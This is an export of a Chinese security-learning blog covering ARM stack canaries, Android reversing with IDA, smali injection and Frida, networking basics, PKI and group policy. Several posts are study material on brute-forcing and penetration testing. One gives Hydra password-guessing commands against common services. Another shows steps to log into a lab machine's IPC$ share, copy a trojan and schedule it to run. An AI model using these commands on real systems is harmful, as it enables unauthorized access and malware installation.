Programmer’s Guide for ARMv8-A》2015 百度百科-影子寄存器 维基百科-ARM架构 CSDN-ARM处理器的7种工作模式和2种工作状态 CSDN-ARM寄存器 详解 CSDN-ARM架构寄存器介绍 CSDN-Cortex-A内核寄存器 CSDN-ARM体系架构总结 博客园-ARM处理器的9种模式详解 简书-ARM Trustzone 技术（二） ARMv7-A Processor modes & registers 的安全扩展 知乎-ARM汇编语言-简介[一] azeria实验室-ARM数据类型与寄存器 ARM-v8架构寄存器组织 Cortex-M与Cortex-A处理器运行模式与寄存器组对比 ARM汇编指令部分： 百度文库-ARM总汇编指令列表 StackOverFlow-What VST/VLD actually do? NEON指令集 博客园-ARM指令集 CSDN-ARM指令集 –RISC精简指令集 CSDN-关于ARM的PC指针(什么时候PC+8, PC+4, PC-4, PC-8) CSDN-arm pc指令 CSDN-arm汇编指令之数据块传输(LDM,STM) CSDN-ARM中的条件执行指令(IT指令) ARM Infocenter-BKPT指令 ARM Infocenter-DCD/DCDU伪指令 ARM Infocenter-LDR伪指令 ARM Infocenter-VMOV指令 ARM Infocenter-MCR指令 ARM Infocenter-BIC指令 ARM Infocenter-IT指令","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android逆向中的Canary机制","slug":"Android逆向中的Canary机制","date":"2021-04-24T07:36:50.000Z","updated":"2022-05-17T15:50:27.911Z","comments":true,"path":"2021/04/24/Android逆向中的Canary机制/","link":"","permalink":"http://cata1oc.github.io/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/","excerpt":"","text":"前言前段时间在做逆向时，看到一个奇怪的指令MRS X23, #3, c13, c0, #2，查了资料后，解释的也比较模糊。尽管不影响主体程序的分析，但没弄明白总让人感觉不舒服。逆到后头发现，这其实是AArch64状态下对于Canary机制的实现。本篇介绍在进行Android逆向时如何识别Canary机制。 什么是Canary机制先说Canary，Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 Canary机制是一种栈保护机制，在函数开始执行的时候，会先在栈底插入cookie信息，在函数真正返回的时候，会验证cookie的值是否合法（栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (防止栈溢出发生)。这个cookie信息也被称为Canary。由于Canary机制的实现简单高效，它被普遍用于Linux系统上预防栈溢出的第一道防线。而Android基于Linux微内核，因而也采用这一机制对栈溢出进行检验。本篇主要介绍Canary机制的特征码，其它知识点不再展开，更多关于Canary机制及其绕过策略的，可以参考这篇文章。 当然除了Linux上的Canary机制，Windows系统上也有类似的栈保护机制：GS机制，关于GS机制相关的内容可以参考此篇。 AArch32状态下的Canary机制先说明一点，这里我改掉了往常的叫法，不再称作AArch32/64架构。经查阅后发现，AArch64是Armv8-A架构中引入的64位状态；向后兼容Armv7-A和先前32位Arm架构的32位状态称为AArch32。因此，AArch32/64不能称作架构，而是基于架构下的一种运行状态，Armv7/v8-A才被称作是Arm架构。 先来看AArch32状态下的，在程序的开头，穿插着保存现场与参数赋值等处理，这里我们只关心Canary机制的实现部分，即图中用橙色方框框出部分。 这里的指令不难理解，主要说明一下PC存储的值，在Arm体系结构中，由于采用了三级流水线运行，PC指向的值并不是当前执行的指令的地址，而是指向正取指的指令地址，参考下图。 PC真正指向的值为PC+4/PC+8（由指令长度决定）。因此，当执行完ADD R0,PC这条指令后，此时R0存的值即为_stack_chk_guard_ptr。最后会通过该指针取到Canary的值，并将其存储到[SP+0x5C]（注：var_1C的值为-0x1C）。 来到结束位置处，橙色方框处与开头时一样，取Canary的值，并将其存放到R1；蓝色方框则是取先前存在栈中的Canary的值到R2，并比较两个寄存器中的Canary值是否相等。若不等，说明这个值被修改过，可能发生了栈溢出，然后会跳转到loc_9566并执行stack_chk_fail。 AArch64状态下的Canary机制接下来，来看AArch64状态下的Canary机制。 首先就是这个在开头提到的MRS X23, #3, c13, c0, #2这条指令，MRS/MSR指令一般是读写CPSR，用来切状态或者设置中断。然而这里的MRS指令则比较奇怪，它并不是去读写CPSR，直观上也很难看明白它到底做了什么，后来在ARM InfoCenter找到MRS指令对应的解释，也没太看明白；通过查阅资料又找到一篇文章，这篇文章对这条指令解释的较为完善了，大概意思就是“以读写权限访问非调试系统寄存器TPIDR_EL0，并将其中的值保存到X23寄存器中”。 这回，弄明白了这条指令的作用后，又有了新的问题，这个TPIDR_EL0寄存器是干什么的？为什么要取它保存的值？文章中对TPIDR_EL0的描述是，软件运行在EL0级别下，可被读写的线程ID寄存器。换句话说，软件在EL0运行级别下，这个寄存器可以存储线程身份信息以便于管理，其作用相当于TLS（Thread Local Storage）。 这里不去讨论TLS的具体内容，但需要知道一点，在PC端（Linux系统）TLS就是存储Canary值的地方。一种常规的绕过Canary机制的手段就是通过覆盖TLS来实现的。因此，在AArch64状态下，起到与TLS类似作用的TPIDR_EL0寄存器，就很可能是存储Canary值的地方。之后经过分析，发现确实是通过TPIDR_EL0寄存器去取Canary值的。 接着回到代码，橙色方框圈住的3行指令可以看出，从TPIDR_EL0+0x28处取出一个值，并将其存入栈中[FP-0x38]处。 再来看程序返回前的代码，和AArch32状态下的执行逻辑几乎一样，分别从原先获取Canary值的位置与栈中保存的位置取出Canary的值，并进行比较，若不等，则跳转执行__stack_chk_fail函数进行处理。 Windows系统下的栈保护机制前面提到了Windows下也有类似的栈保护机制：GS机制。其原理与Canary类似，这里也简单看下。 X86指令集中GS机制的实现 在程序开头，先获取到__security_cookie的值，与ebp进行异或运算后（异或运算的逆运算是其本身），存到[ebp-0x4]的位置处。 在程序返回之前，从[ebp-0x4]中将值取出，再与ebp进行异或运算后，调用函数__security_check_cookie（这里没有push参数进去，显然是fastcall），该函数内部会对异或后的值进行校验，若与__security_cookie的值不符，说明栈中的值被修改了，可能发生了栈溢出，则跳转进行处理，否则正常返回。 经过分析，可以看出Windows下的GS机制，与Linux下的Canary机制的原理完全一样。 X64指令集中GS机制的实现 了解了x86指令集中的GS机制实现，再看x64的那是轻而易举。流程几乎是一样的，唯一不同的在于_security_check_cookie函数中，多了一个对栈中取到的__security_cookie值的高16位进行的校验，若校验失败（值为0），则同样会执行失败，进行对应的处理。 参考资料 Bilibili专栏-Canary机制及绕过策略 CSDN-Windows安全机制-栈保护：GS机制 博客园-Arm64和AArch64指令集是同一回事吗 AArch64中的线程ID寄存器 ARM InfoCenter-MRS指令 语雀-线程栈|TLS绕过Canary","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"Android逆向思路及注意事项","slug":"Android逆向思路及注意事项","date":"2021-03-21T06:10:11.000Z","updated":"2022-05-17T15:50:01.203Z","comments":true,"path":"2021/03/21/Android逆向思路及注意事项/","link":"","permalink":"http://cata1oc.github.io/2021/03/21/Android%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"前言入职公司一周，完成了一个小项目，与Android逆向有关，具体就不能透露了，在逆向过程中遇到了不少的坑，本篇做一个小的经验总结，在以后进行Android逆向时，能有更好的切入手段。 分析思路逆向分析时采用的几个主要手段（这里就不区分静态分析与动态分析了）： 分析第三方so库 动态调试 Smali代码注入 Frida Hook 第三方so库的分析一般来说，将apk经过Apktool反编译后，在lib\\arm（通常这里有多个版本）目录下会存放该app应用到的第三方so库。在分析经过反汇编得到的Java代码后，有些类可能会直接调用Native方法，如果这个Native方法实现了重要的功能，这时候就需要分析这个Native方法所在的so库了。so库拖进IDA就是Arm/Thumb指令，IDA 7.5版本的F5现在还挺好用，可以结合的看。 这里总结一下常见的几个寄存器，和x86类比的看： R0通常存返回值，相对于EAX SP相对于ESP PC相对于EIP B相对于jmp BL相对于call 注意事项：不要轻易相信so库中的函数名，第三方库往往为了安全性，故意弄出一些欺骗性的函数名影响你的判断，因此函数名只可作参考，切勿全信。 动态调试Android的动态调试分为Java层的动态调试和so层的动态调试，Java层主要以smali汇编为主，so层则以arm/thumb汇编为主；然而很多App都有反调试机制，加上IDA Pro的名气又那么大，所以动态调试很容易失败。这里只简单说明一下调试过程以及注意事项。这里以IDA Pro为例进行演示。 So层 在IDA Pro7.5\\dbgsrv的目录下，可以用于调试其它操作系统的调试服务器，若想调试Android手机，需要先通过指令adb push android_server /data/local/tmp 将调试用的服务器（注：安卓模拟器的属于x86架构）push到真实机里。 然后转发端口adb forward tcp:23946 tcp:23946（23946是IDA的默认端口） 修改android_server权限（一般为755），并执行./data/local/tmp/android-server &，来启动服务器。这时命令行中可以看到正在对端口进行监听。 进入IDA->Debugger->Attach->Remote ARM Linux/Android debugger。这里主机名和端口号，看命令行中，监听的主机名和端口号是啥，就填啥 完了，就可以Attach吧，大部分app都有反调试，一下断点就死。Run的方法，我没成功过。 Java层 Java层动态调试好像并不需要监听，所以只要将需要调试的apk文件，从手机里pull一份出来就行。一般系统软件在system/app文件夹下，预装软件在data/app文件夹下。拿到apk文件后，直接拖入IDA，选择dex文件进行加载。 设置debugger选项，Debugger->Debugger options->Set specific options，在Package Name和Activity中分别填入包名和第一个启动的Activitiy。 这里介绍两种找包名和Activity的方式： 反编译apk文件后得到AndroidManifest.xml，打开该文件后查找包名和Activity，在找Activity时找intent-filter元素中action元素值为android.intent.action.MAIN的Activiy，它就是当前应用的主activity。 先启动app，然后在命令行中执行Frida-ps -U列出所有进程，这里看到的实际上就是各个应用的包名；关掉app，执行dumpsys | grep 包名来抓取app启动时运行的各种服务（Activity、Package、Window等）的信息，再启动app，就可以找到第一个启动的Activity的页面了。 设置Debugger->Process options，主要就是改这个端口号，网上教程一般会给它设置为8700，我就用的默认的23946，但是运行后会给你校正到23915，这个问题不大，在命令行中执行adb forward tcp:23915 tcp:23915给它转发一下就能用了。 最后Debugger->Start process或者点击上方的绿色小三角启动应用，如果手机屏幕出现Waiting For Debugger的界面就说明设置成功了，可以进行动态调试了。此时屏幕上应为smali汇编，如果界面停留在一堆数据的页面也不要慌，View->Open subview->Functions进入函数界面，随便点进去就是smali汇编代码。接下来就可以搜自己想要分析的smali函数进行下断和调试了。 Smali代码注入smali注入是我这次项目实现的关键。这里介绍几种适合注入的代码。 log插桩Python代码（命令行）： python123456>>>import frida>>>device = frida,get_usb_device()>>>device #这里是检查一下是否获取到device，测试机较旧不稳定>>>pid = device.spawn('com.miui.home') >>>pid #打印pid的值，在另一个窗口中用logcat | grep pid对该进程产生的日志进行捕捉>>>device.resume(pid) Smai代码： smali123const-string v0, \"HOOK POINT\"const-string v1, \"Hello Smali\"invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I 作用： 打印程序执行时一些字段的值（变量，参数，返回值等） 帮助分析程序完整的执行流程 Toast弹窗smali12345const-string v0, \"Hello Toast\" const/4 v1, 0x0invoke-static {p1, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/String;I)Landroid/widget/Toast;move-result-object v0invoke-virtual {p1}, Landroid/widget/Toast;->show()V p0 ：this（Context类型） v0：弹出的字段（可更改类型，但是要和makeText中的一致） v1：弹窗时长 其它Smali代码 将Java代码经过j2s2j转成smali 手动调用未执行代码 注意事项 寄存器：寄存器一定不能有误，否则程序必定Crush。如果一个寄存器保存的值，接下来会被使用，那么最好别用这个寄存器。转而借用下面的代码即将重新赋值的寄存器。如果赋值不是非常麻烦的话，也可以先借用这个寄存器打印log或者用toast弹窗，完了再给这个寄存器重新赋值。（补充move指令对寄存器长度和编号的限制） 类型：类型一定要匹配，例如log的参数一定要是String类型，Toast的参数类型要和寄存器中的参数匹配。 日志类型：一般被逆的应用基本上都是release版的，这意味着只能打印info级别的日志，像在smali中添加调用栈打印的函数就很难被捕捉到，或者可以找到对Log类型的作判断的地方进行修改，让release版本也能打印出debug/warn/error级别的日志。 Frida Hook这里简要列举一下，用js调用Frida接口的几个常见模板： Hook so库中的函数javascript123456789//Hook Native函数interceptor.attach(Module.getExportByName('库名.so', '函数名'),{ onEnter: function(args){ // }, onLeave: function(retval){ }}); Hook Java层函数javascript1234567//Hook Java层函数(例：拦截Activity类的onResume函数)Java.perform(function(){ var Activity = Java.use('android.app.Activity'); Activity.onResume.implementation = function() { console.log('Hello Frida!'); };}); 打印调用栈javascript123//对Hook到的函数，打印调用栈var bt = Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new());console.log(\"\\nBacktrace:\\n\" + bt); Frida的局限性通常来说，在编写好js脚本后，会通过编写python代码启动app并将js脚本注入。这也意味着，js实际上是在app加载之后才注入的，因此，有些想要拦截的so库函数，已经执行完了，就无法拦截到；如果想要在app启动的同时注入js脚本，则会因为so库未加载，导致报错。这种情况下，需要通过smali插桩拦截较早执行的函数，Frida Hook更适用于在app启动以后，对一些控件进行操作时，拦截用户的输入信息以及返回值等等。 常见反编译工具功能 dex2jar：dex->jar Apktool：apk smali baksmali/smali：dexsmali unzip(常规解压)：apk->dex J2S2J：javasmali JEB/jadx：apk->java（直接拖进去看即可） 注意事项：反编译工具有一定的局限性，并不能100%还原真实的Java代码，因此只能作为参考，不能全信，要分析真正的执行流程，推荐用smali插入log来进行分析。 承上启下似乎很久没有更新博客了，确实，但也只有20天而已，显示的时间不过是刻意呈现出来的假象，过去的事也不必刻意去弥补了。 月初，入职了新公司，分配到了Android逆向的岗位，对于进入Android逆向领域，在我的计划之中，但没想到来的这么快，这也让我不得不调整计划，对Web领域的学习只能延后了。现在入职也有一周半了，各方面的体验还都不错。 当然，工作后，通勤时间变长，日程安排也紧凑了，每晚只能挤出一小时左右，用于弥补目前工作上的欠缺。博客的更新进度，又要停滞了。但现在有份比较满意的岗位，博客的更新，就不那么迫切了。目前，对于Android逆向的学习，进入了”愚昧山峰”的阶段，因此目前在这个领域的能力还是远远不够的。后续仍需努力去沉淀已经掌握的知识。 参考资料参考书籍： 《Android软件安全权威指南》—— 丰生强 参考连接： 不同反编译工具的功能 r0ysue的Frida入门教程 IDA动态调试Android的DEX文件 IDA动态调试Android的DEX文件2.0","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"网络安全基础11：OSI模型与TCP/IP模型、物理层","slug":"网络安全基础11-OSI与TCP-IP","date":"2020-10-09T16:27:53.000Z","updated":"2022-05-17T15:48:14.541Z","comments":true,"path":"2020/10/10/网络安全基础11-OSI与TCP-IP/","link":"","permalink":"http://cata1oc.github.io/2020/10/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8011-OSI%E4%B8%8ETCP-IP/","excerpt":"","text":"OSI以及TCP/IP这些属于计网知识，本科期间已学习过，且考研那会又看了一遍，还是有些底子的，网上的优质文章也非常多，本篇仅作一些精简的要点记录，以及曾经未接触过的知识面。 分层模型分层思想 将复杂的流程分解为几个功能相对单一的子过程（参考下图收发信件的过程，体现了分层的思想） OSI参考模型为了让各种计算机在世界范围互联，OSI（Open System Interconnection）七层模型被提出。 TCP/IP模型OSI模型没有最终被采用，专家们在往每一层里添加协议时，发现表示层与会话层有些多余，于是就将这两层融合到了应用层中。于是有了TCP/IP模型，又称TCP/IP协议簇。 融合进应用层后，应用层需要实现表示层与会话层原先的功能： 表示层：将数据转码 会话层：消息排队，维护秩序 TCP/IP模型 vs OSI模型 数据传输过程数据封装与解封装过程 同层使用相同的协议 下层为上层提供服务 FCS：Frame Check Sequence，校验序列，检查包的完整性 MAC子层：包含目标MAC地址，源MAC地址，类型 IP包头：包含源IP地址，目的IP地址 TCP/UDP头：源端口号，目的端口号 TCP/IP协议簇协议与层的对应关系 ICMP功能：差错通知和信息查询 确认IP包是否成功到达目标地址 通知在发送过程中IP包被丢弃的原因 设备与层的对应关系 各层间通信 物理层传播媒介网线/光纤/空气 信号 电信号： 模拟信号：旧式电话（通过电话线传播，放大器增加传播距离） 数字信号：计算机（通过电路传播，中继器修复信号） 光信号：光纤 单模光纤：一般黄色/黑色 多模光纤：一般橙色/蓝色 调试解调器（又称作猫，Modem）： 旧：将电话线上的模拟信号与电脑可以理解的数字信号进行互相转化 新：又称作光猫，将光纤上的光信号与电脑可以理解的数字信号进行互相转化 网线/双绞线 种类 5类：淘汰 超5类：主流 6类：比超5类更抗干扰 7类 型号及用图 交换机与路由器 端口 接入端口：连接电脑 上联端口：连接上层核心交换机（通常设计2个） Console口：企业级交换机特有（无界面），用来管理交换机的接口 端口带宽 Ethernet：10Mb/s（这里是小写的b，办理宽带业务时，通常遇到的也是小写，而电脑都是以字节为单位，因此真实带宽往往只有实际标注的1/8） FastEthernet：100Mb/s GigabitEthernet：1000Mb/s TenGigabitEthernet：10000Mb/s 交换机类型 普通交换机 模块化交换机：模块可拆卸 三层交换机：家用路由器 Cisco Packet Tracer一个功能非常强大的网络模拟工具，可以提供真实操作经验。通过它可以练习使用路由器、交换机和其它各种设备构建简单或复杂的网络。下面对部分功能及设置作简要介绍： 偏好设置在偏好设置中，对模拟设备进行自定义设置，通常来说，会关闭模拟设备的名称显示，并打开端口显示，便于操作。 这里说明Fa0/3的含义： Fa：FastEthernet，说明是百兆接口 0：表示该交换机的第一个模块 0/3：表示该交换机第一个模块的第三个接口 部署局域网可以对所有模拟设备进行配置。例如给设备配置IP，给服务器配置DSN/DHCP的服务。实现局域网中的功能等等。 参考资料 千峰网络安全开源课程p52-55 beglage学习笔记 ICMP协议详解 完全理解ICMP协议","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础10：扫描与暴破","slug":"网络安全基础10-扫描与暴破","date":"2020-10-09T15:34:05.000Z","updated":"2022-05-17T15:47:48.059Z","comments":true,"path":"2020/10/09/网络安全基础10-扫描与暴破/","link":"","permalink":"http://cata1oc.github.io/2020/10/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8010-%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9A%B4%E7%A0%B4/","excerpt":"","text":"真实机桥接靶机学习本节时，是通过真实机（Windows 10）攻击靶机（Windows 2003）的，这里简单介绍真实机桥接靶机的过程： 将靶机桥接到VMnet1 在真实机中进入更改适配器选项，然后找到一个VMnet1，修改其IP地址，把它和靶机放到同一个网段就行 然后ping一下验证一下，基本上没问题 常见端口本篇介绍扫描与暴破，扫描就主要和端口有关，下面列出一些常见端口（部分先前已经了解过） 端口号 对应服务 20, 21 FTP 22 SSH 23 Telnet 25 SMTP 53 DNS 67, 68 DHCP 80 HTTP 443 HTTPS 445 SMB（共享） 1433 SQL Server 1521 Oracle 3306 MySQL 3389 RDP Nmap前一篇提到的ScanPort，基本上没什么用，只是多次执行telnet指令的结果，主流的还是Nmap。Kali会集成好Nmap，Windows需要自己下载。下面介绍Nmap入门需要了解的参数，以及一些例子： 参数 含义 -sP ping扫描 -p 指定端口范围 -sV 服务器版本探测 -O 启用操作系统探测 -A 全面扫描 -oN 结果保存到txt 命令 含义 Nmap -sP 10.1.1.1/24 扫描10.1.1.0整个网段所有在线的主机 Nmap -p 21,23-25,3389 10.1.1.1 扫描10.1.1.1主机的指定端口（是否打开） Nmap -p 21,23 10.1.1.1 -sV 扫描21，23端口服务的版本 Nma -O 10.1.1.1 扫描目标系统版本及打开端口 Nmap -A 10.1.1.1 全面扫描 Nmap -p 21,23 10.1.1.1 -oN c:\\result.txt 将扫描结果保存到c:\\result.txt 暴破工具前一篇没讲暴破，因为原理比较简单，字典生成器生成密码字典，然后用暴破工具跑字典进行暴破。比较有名的是Hydra。命令为Hydra.exe -l 用户 -p 密码 IP地址 协议（小写字母接真实数据，大写字母接字典路径）。例如： Code1234567Hydra.exe -l admin -p 123456 10.1.1.1 telnet Hydra.exe -l admin -P d:\\password.txt 10.1.1.1 rdpHydra.exe -l admin -P d:\\password.txt 10.1.1.1 smbHydra.exe -l admin -P d:\\password.txt 10.1.1.1 ftpHydra.exe -l admin -P d:\\password.txt 10.1.1.1 sshHydra.exe -l admin -P d:\\password.txt 10.1.1.1 mysql Hydra.exe -L d:\\user.txt -P d:\\password.txt 10.1.1.1 mysql 密码破解方式这里总结一下，目前了解过的密码破解方式，本地暴破就不详细介绍了，实际操作性不强，而且工具也比较旧了。 物理暴破：5次shift破解系统密码，利用PE破解系统密码 远程暴破：Nmap+Hydra 本地暴破：情形：“你电脑借我用2分钟，一会还你” Getpass（从内存中提取密码，适用于Win10之前的系统） Pwdump（提取SAM中的hash值，需手工存储）+ saminside（SAM暴破工具，需要密码字典） 参考资料 千峰网络开源安全课程 beglage学习笔记","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础09：渗透测试入门","slug":"网络安全基础09-渗透测试入门","date":"2020-10-08T12:48:44.000Z","updated":"2022-05-17T15:47:23.296Z","comments":true,"path":"2020/10/08/网络安全基础09-渗透测试入门/","link":"","permalink":"http://cata1oc.github.io/2020/10/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8009-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/","excerpt":"","text":"渗透测试的流程 获得授权：正规渗透测试都是需要厂商签署授权协议，并指定授权范围和需求的。未经授权的渗透测试都是不合法的。详情参考道哥的这篇回答 信息收集：收集渗透所需的相关信息，例如渗透目标的IP地址，或者利用社会工程学获取到目标相关信息等。 扫描漏洞：用扫描器扫描目标设备开放的端口，高级扫描器可以扫描出目标系统或网站存在的漏洞。 漏洞利用：编写漏洞利用代码，通过漏洞提升权限。 提权：获取shell环境，就是俗称的GetShell，拿到攻击目标的最高控制权。 抹除痕迹：清除目标系统的日志，访问历史记录等 留后门：通过木马留下后门，方便下次进入 渗透测试报告：指出授权方存在的漏洞，并给出解决思路 以上为渗透的一个常见流程，下面会介绍一些入门级的手法，好对渗透有个形象的理解。 telnet命令在Windows的命令行中执行telnet IP地址 测试端口，可以测试目标主机开放了哪些端口号。端口未打开时会显示连接失败，端口打开时会进入黑屏或者要求输入账号密码。 扫描工具通过telnet命令一条条试比较浪费时间，因此可以依靠扫描工具，针对指定IP范围进行端口扫描，下图为scanport扫描的结果。 后面的文章会介绍到nmap，它是一款非常强大的扫描器，甚至可以针对不同版本的系统扫描出未修复的漏洞。 445端口根据先前的学习，了解到445端口提供共享服务。但这个端口也会引发较大的安全问题，下面来看一个简短的利用过程。执行如下指令： Code1net use \\\\10.1.1.1\\ipc$ 123.com /user:administrator 10.1.1.1：靶机IP地址。 ipc$：空连接。 123.com：靶机管理员密码。 administrator：靶机管理员账号。 这个指令有什么用呢。执行完后，会与靶机建立连接，此时可以直接操纵靶机的磁盘和文件，例如执行指令dir \\\\10.1.1.1\\c$，就可以列出靶机C盘下的所有文件（注意这里要用隐藏共享格式）。 接下来，就可以利用工具制作木马（例如灰鸽子，没找到能用的，就不演示了），并将其植入，例如执行copy c:\\trojan.exe \"\\\\10.1.1.1\\c$\\Program Files\"将木马复制到靶机的Program Files目录下。然后可以先通过指令net time \\\\10.1.1.1获取靶机系统的当前时间，再通过指令at \\\\10.1.1.1 15:30 \"c:\\Program Files\\trojan.exe\"给靶机安排一个定时任务，从而执行被植入的木马。木马执行后，获得对靶机的最高权限，就可以在灰鸽子客户端对靶机进行任意操纵。 参考资料 千峰网络安全开源课程p44~46 道哥回答-未授权渗透测试中的法律边界是什么?","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础08：PKI","slug":"网络安全基础08-PKI","date":"2020-10-04T05:14:20.000Z","updated":"2022-05-17T15:46:51.145Z","comments":true,"path":"2020/10/04/网络安全基础08-PKI/","link":"","permalink":"http://cata1oc.github.io/2020/10/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8008-PKI/","excerpt":"","text":"PKI概述 名称：Public Key Infrastructure，公钥基础设施。 作用：通过加密技术、数字签名和数字证书保障信息的安全。 组成：加密技术、数字证书、CA、RA等。 应用领域： SSL/TLS/HTTPS IPsecVPN 部分远程访问VPN 信息安全三要素机密性、完整性、身份验证/操作的不可否认性。 PKI组成加密技术对信息加密、数字签名等安全保障。 散列函数（hash）：把任意长度的输入消息数据转化成固定长度的输出数据的一种密码算法。常用于生成摘要。 消息验证代码：验证数据完整性，即数据没有被篡改。 非对称加密：双方各自产生一对公私钥，并各自交换公钥，用对方提过的公钥加密，用自己的私钥解密（公钥和私钥互相加解密关系，但不可互相逆推）。 数字签名：结合散列函数，用私钥对摘要加密，公钥解密。验证消息真实性。 伪随机函数（PRF）：生成任意数量的伪随机数据。 数字证书包含了用于签名和加密数据的公钥的电子凭证，是PKI的核心元素。用于保证公共密钥的合法性，格式遵循X.509标准，并由权威公正的第三方机构（即CA）签发。 数字证书包含的信息包括但不限于： 使用者的公钥值 使用者的标识信息（如名称和电子邮件地址） 有效期（证书的有效时间） 颁发者标识信息 颁发者的数字签名 数字证书的种类如下： 认证中心（CA）数字证书的申请及签发机关，CA必须具备权威性。 数字证书注册中心（RA）负责数字证书申请者的信息录入、审核及证书发放等工作。 加密传输流程（20210427更新）下面，用一个简单的加密传输流程，演示PKI对信息加密的安全保障应用。 A试图向B发送信息 A发送公钥abc给CA，向权威机构CA申请证书 CA为A颁发证书，并用自己的私钥666为A的公钥abc签名 A和B交换公钥，同时A将自己的证书发送给B B对权威机构CA足够信任，获取到CA的公钥999 B用公钥999解开A证书的签名，比对证书中的公钥与A发送过来的公钥是否相同，若相同，则可以验证确实是A的公钥。 A通过RSA算法用B的公钥123对数据进行加密 A对已经加密的数据进行哈希算法，获取到摘要 A用自己的私钥cba通过RSA算法对摘要进行加密，得到签名 A将签名放到加密数据的末尾，一并发送至B 先前B已经确认A的公钥属于A本人无误 B收到数据后，用A的公钥abc对签名进行解密，若解密成功，得到摘要，则可验证数据完整未被破坏。 B用自己的私钥321解开加密的数据。 总结（取自知乎）： 你只要想，既然是加密，那肯定是不希望别人知道我的消息，所以只有我才能解密，所以可得出公钥负责加密，私钥负责解密；同理，既然是签名，那肯定是不希望有人冒充我发消息，只有我才能发布这个签名，所以可得出私钥负责签名，公钥负责验证。 PKI实验流程环境 HTTPS服务器：Windows 2008 客户机：Windows 7 桥接到虚拟网络VMnet1 实验步骤 为两台虚拟机配置IP地址 安装IIS服务，建立站点，配置DNS服务器（使用域名），并用客户机访问http网址进行初步验证 安装CA组件 打开IIS，生成证书申请文件 向CA申请证书：打开网页 http://x.x.x.x/certsrv 并向CA发送web服务器申请文件 CA颁发证书 在Web服务器上下载并完成安装 在Web服务器上启用SSL443 要求用户必须使用443访问，不能使用80访问 参考资料 千峰网络安全开源课程p42, p47~48 简书-PKI 体系概述 博客园-PKI详解 阮一峰-深入浅出SSL/TLS CSDN-beglage学习笔记 知乎-RSA公钥私钥关系","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础07(下)：组策略","slug":"网络安全基础07-下-组策略","date":"2020-10-03T15:06:36.000Z","updated":"2022-05-17T15:46:27.391Z","comments":true,"path":"2020/10/03/网络安全基础07-下-组策略/","link":"","permalink":"http://cata1oc.github.io/2020/10/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8007-%E4%B8%8B-%E7%BB%84%E7%AD%96%E7%95%A5/","excerpt":"","text":"组织单位组织单位（Organizational Unit，简称OU），用于归类域资源（域用户、域计算机、域组），OU和组很类似，都是对同类型资源进行归类。组的诞生，主要是方便赋权限；而OU的诞生，是为了方便下发组策略。下图为在活动目录中查看的OU。 组策略基本概念组策略（Group Policy，简称GPO），是一组可以修改计算机系统（Windows）各种属性的策略，例如修改开始菜单、桌面背景、网络参数等。组策略分为本地组策略和域中组策略，组策略在域中是基于OU来下发的。下图为在组策略管理中查看域下的各个OU，并为之创建单独的组策略。 下发流程如何下发一个组策略，这里以前一篇加入的域用户为例。简单说明一下流程： 在活动目录中，将域用户（用户&计算机）加入指定的OU中（例如加入到西北区） 进入组策略管理，给西北区新建组策略。 右键编辑，进入组策略管理编辑器。这里有两类： 计算机配置：重启时生效，任何人登录这台计算机，都会应用相应的组策略。 用户配置：登录时生效，拿该账号登录任何计算机，都会应用相应的组策略。 在下方的目录寻找，并在右边选择相应的组策略设置状态（已启用/已禁用/未配置） 以强制设置桌面墙纸为例，状态设置为已启用，选项中墙纸名称通常设置为共享路径（即新建一个共享文件夹，存放墙纸图片），例如\\\\10.1.1.1\\share\\pic.jpg。从而让域成员能够从服务器下载到组策略所需的文件。 最后根据哪一类的组策略，选择重启或者重新登录进行验证。 生效顺序当一台主机被应用多个组策略时，组策略的生效顺序遵循LSDOU（Local->Site->Domain->Organizational 